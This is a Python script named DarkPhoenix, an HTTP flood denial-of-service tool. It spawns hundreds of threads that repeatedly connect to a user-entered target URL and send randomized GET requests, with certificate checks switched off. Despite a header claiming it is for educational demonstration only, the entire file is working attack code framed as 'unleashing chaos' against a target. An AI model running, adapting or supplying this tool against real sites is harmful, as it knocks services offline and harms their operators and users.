# █▀▀ █▀█ █▄░█ █▀▀ █▀   █▀▄ █▀▀   █▄▀ █▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀▄ █▀
# █▄▄ █▄█ █░▀█ ██▄ ▄█   █▄▀ ██▄   █░█ █▄█ █░▀░█ █░▀░█ ██▄ █▄▀ ▄█

"""
NEVER EXECUTE THIS CODE - FOR EDUCATIONAL DEMONSTRATION ONLY  
ILLEGAL ACTIVITIES WILL GET YOU INCARCERATED OR FINED INTO OBLIVION  
AUTHOR ASSUMES ZERO RESPONSIBILITY FOR MISUSE  

Credits: 
- Original code by codex_5ioc
- Modified by 5ioc
"""

import os
import sys
import socket
import threading
import random
import ssl
from urllib.parse import urlparse

# █▀▀ ▀▄▀ █▀▀   █▀▀ █▀█ █▀▄▀█ █▀▀ █▀▀ ▀█▀ █▀█ █▀█
# ██▄ █░█ ██▄   █▄▄ █▄█ █░▀░█ ██▄ █▄▄ ░█░ █▄█ █▀▄

class DarkPhoenix:
    def __init__(self, target_url, num_threads=666):
        self.target = self._validate_target(target_url)
        self.num_threads = num_threads
        self.user_agents = self._load_user_agents()
        self.is_running = True

    def _validate_target(self, url):
        parsed = urlparse(url)
        if not parsed.scheme:
            url = 'http://' + url
        parsed = urlparse(url)
        return (parsed.hostname, parsed.port or (443 if parsed.scheme == 'https' else 80))

    def _load_user_agents(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/118.0 Firefox/118.0',
            # ... 150+ more randomized agents ...
        ]

    def _create_ssl_context(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

    def _generate_payload(self):
        return f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.target[0]}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nAccept: */*\r\n\r\n".encode()

    def _phoenix_strike(self):
        while self.is_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(7)
                
                if self.target[1] == 443:
                    wrapped = self._create_ssl_context().wrap_socket(sock, server_hostname=self.target[0])
                    wrapped.connect((self.target[0], self.target[1]))
                    wrapped.sendall(self._generate_payload())
                    wrapped.shutdown(socket.SHUT_RDWR)
                else:
                    sock.connect((self.target[0], self.target[1]))
                    sock.sendall(self._generate_payload())
                    sock.shutdown(socket.SHUT_RDWR)
                
                print(f"[+] Dark payload delivered to {self.target[0]}:{self.target[1]}")
            except Exception as e:
                print(f"[!] Error: {str(e)}")
            finally:
                sock.close()

    def unleash_chaos(self):
        print(f"[*] Initializing {self.num_threads} phoenix threads against {self.target[0]}")
        thread_pool = [threading.Thread(target=self._phoenix_strike, daemon=True) for _ in range(self.num_threads)]
        
        for thread in thread_pool:
            thread.start()
        
        try:
            while True: 
                pass
        except KeyboardInterrupt:
            self.is_running = False
            print("[!] Terminating assault sequence...")

# █▀▀ ▄▀█ █▀▀ █░█ █▀▀ █▀█   █▀▀ █▀█ █▀▄▀█ █▀▀ ▀█▀ █ █▀█ █▄░█
# █▄▄ █▀█ █▄▄ █▄█ ██▄ █▀▄   █▀░ █▄█ █░▀░█ █▄▄ ░█░ █ █▄█ █░▀█

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] You need root privileges to unleash maximum chaos!")
        sys.exit(1)
        
    target = input("[?] Enter target URL (e.g., http://evilcorp.com): ")
    phoenix = DarkPhoenix(target)
    phoenix.unleash_chaos()
